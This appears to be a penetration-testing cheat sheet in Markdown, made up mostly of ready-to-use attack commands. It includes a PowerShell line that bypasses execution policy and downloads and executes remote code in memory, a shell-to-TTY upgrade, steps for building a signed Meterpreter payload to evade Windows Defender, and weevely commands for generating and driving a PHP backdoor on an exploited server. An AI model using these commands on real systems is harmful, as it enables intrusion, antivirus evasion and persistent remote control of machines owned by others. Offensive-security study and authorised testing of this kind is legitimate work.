# Table of contents
* [PowerShell](#powershell)
  * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
* [Utils](#utils)
  * [Shell to TTY](#shell-to-tty)
  * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
* [PrivEsc on Windows](#privesc-on-windows)
  * [Bypassing Windows Defender](#bypassing-windows-defender)

# PowerShell
## To load a PS module into the memory
```powershell
powershell.exe -exec bypass -Command “IEX (New-Object Net.WebClient).DownloadString($URL);"
# Here call the modules you want to execute, depending on the usage of what you have downloaded
```
# Utils
## Shell to TTY
```bash
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl + z
stty raw -echo
fg
```
## Sharing files with Windows machine
**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)* 
```bash
impacket-smbserver share [path] -smb2support
```
# PrivEsc on Windows
## Bypassing Windows Defender
There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them. 

**NOTE:** There're some replaces needed in the listener.sh script:

1. *Line 12:* remove the ./ from the call to msfconsole
2. *Line 16:* add -job after the run sentence

```bash
./msf-loader.sh
# introduce LHOST
# introduce LPORT
# domain to impersonate?
# The process should have created a 'payload.exe' and also 'payload-signed.exe'
./listener.sh
# Define the LHOST
# Define the LPORT
# Now the payload shall be ran into the target
```

# WebApplication Hacking
## Create a PHP Backdoor shell
The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
server.

```bash
# Generate new agent
weevely generate <password> <path>
# Run terminal or command on the target
weevely <URL> <password> [cmd]
# Recover an existing session
weevely session <path> [cmd]
```
